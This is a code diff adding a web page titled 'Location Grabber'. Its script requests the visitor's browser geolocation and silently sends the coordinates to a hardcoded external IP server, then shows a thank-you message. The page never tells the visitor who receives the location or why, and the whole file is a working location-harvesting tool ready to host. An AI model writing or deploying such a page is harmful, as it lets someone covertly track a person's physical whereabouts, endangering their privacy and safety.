@@ -1,0 +1,32 @@
+<!-- /var/www/location/index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Location Grabber</title>
+</head>
+<body>
+  <h2>Please allow location access...</h2>
+
+  <script>
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        // Send to your backend (adjust this URL to match your server)
+        fetch('http://141.94.221.190:5000/location-submit', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ latitude: lat, longitude: lon })
+        });
+
+        document.body.innerHTML = `<p>Thanks! Your location was shared.</p>`;
+      }, function(error) {
+        alert("Permission denied or error: " + error.message);
+      });
+    } else {
+      alert("Geolocation is not supported by this browser.");
+    }
+  </script>
+</body>
+</html>
